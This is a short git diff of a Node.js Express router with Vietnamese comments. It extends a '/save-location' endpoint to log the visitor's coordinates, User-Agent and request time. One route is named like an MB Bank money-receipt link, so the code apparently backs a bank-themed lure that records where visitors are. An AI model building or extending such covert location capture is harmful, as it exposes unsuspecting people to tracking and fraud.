@@ -60,13 +60,27 @@ router.use('/mbbank-nhan-tien-id_mbbank_93903904-hoangvanmanh', (req, res) => {
 });
 router.post('/save-location', (req, res) => {
     const { latitude, longitude } = req.body;
-    console.log(req.body);
-    // Xử lý dữ liệu, ví dụ: lưu vào cơ sở dữ liệu, hoặc chỉ in ra
+    
+    // Lấy thông tin User-Agent
+    const userAgent = req.headers['user-agent'];
+
+    // Lấy thời gian hiện tại và format theo "ngày tháng năm giờ phút giây"
+    const timestamp = new Date();
+    const formattedTime = `${timestamp.getDate()}/${timestamp.getMonth() + 1}/${timestamp.getFullYear()} ${timestamp.getHours()}:${timestamp.getMinutes()}:${timestamp.getSeconds()}`;
+
+    // Log thông tin
+    console.log('Thông tin yêu cầu:');
+    console.log('Thời gian yêu cầu:', formattedTime);
+    console.log('User-Agent:', userAgent);
+    console.log('Dữ liệu nhận được:', req.body);
     console.log('Nhận được vị trí:', { latitude, longitude });
+    console.log('===========================================');
 
     // Trả về phản hồi cho client
     res.json({ message: 'Dữ liệu vị trí đã được nhận thành công', latitude, longitude });
 });
+
+
 //=========================================================
 router.use("/lottery",(req,res)=>{
     res.json(lottery);
